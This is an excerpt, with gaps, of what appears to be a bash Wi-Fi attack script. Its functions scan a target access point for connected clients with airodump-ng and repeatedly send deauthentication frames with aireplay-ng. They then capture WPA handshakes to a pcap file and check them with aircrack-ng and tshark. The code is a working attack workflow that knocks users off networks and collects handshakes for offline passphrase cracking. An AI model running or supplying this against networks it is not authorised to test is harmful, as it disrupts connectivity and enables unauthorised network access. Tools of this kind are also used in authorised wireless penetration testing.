...
capture_clients() {
    ...
    rm -f "$csv_file"
    echo "Scanning for clients on $bssid (channel $channel)... (up to ${duration}s)"
    # Capture for a short window to populate station list (fallback to plain call if timeout is unavailable)
    if command -v timeout >/dev/null 2>&1; then
        timeout "${duration}s" airodump-ng --bssid "$bssid" --channel "$channel" --output-format csv --write client "$foo" >/dev/null 2>&1
    else
        airodump-ng --bssid "$bssid" --channel "$channel" --output-format csv --write client "$foo" >/dev/null 2>&1 &
        local cap_pid=$!
        sleep "$duration"
    ...
    # Parse station list (second section) for clients associated with the target BSSID
    client=$(
        awk -F',' -v bssid="$bssid" '
            {
                gsub(/^[ \t]+|[ \t]+$/, "", $1)
    ...
    if [ -n "$client" ]; then
        echo -e "\e[32m[Client]\e[0m Targeting client $client"
    else
...
check_valid_handshake() {
    ...
    if command -v aircrack-ng >/dev/null 2>&1 && [ -n "$bssid" ]; then
        ...
        aircrack_output=$(aircrack-ng -a2 -b "$bssid" -w /dev/null "$cap_file" 2>/dev/null)
        if echo "$aircrack_output" | grep -qi "passphrase not in dictionary"; then
    ...
    # Fallback: basic EAPOL presence check via tshark
    if command -v tshark >/dev/null 2>&1 && tshark -r "$cap_file" -Y "eapol" -c 1 >/dev/null 2>&1; then
        echo "EAPOL data found in $cap_file (fallback check)"
        return 0
    fi

    echo "No valid handshake found in $cap_file"
    return 1
}
...
deauthAttack () {
    ...
    while [ "$attempt" -le "$MAX_HANDSHAKE_ATTEMPTS" ]; do
        ...
        # Clean old capture artifacts for clarity
        rm -f handshake-*.cap client.cap 2>/dev/null

        # Start capture
        sudo airodump-ng --bssid "$bssid" --channel "$channel" --output-format pcap --write handshake "$foo" >/dev/null 2>&1 &
        airodump_pid=$!
        ...
        if [ -n "$client" ]; then
            xterm -e aireplay-ng -0 25 -a "$bssid" -c "$client" "$foo"
        else
            xterm -e aireplay-ng -0 25 -a "$bssid" "$foo"
        fi
